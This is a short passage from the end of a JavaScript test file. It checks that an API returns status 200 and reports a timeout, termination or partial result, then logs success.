      expect(response.status).toBe(200)
      const data = await response.json()

      // Should indicate timeout or early termination
      expect(data.status).toMatch(/timeout|terminated|partial/)

      console.log('✅ Timeout scenario handling successful')
    })
  })
})
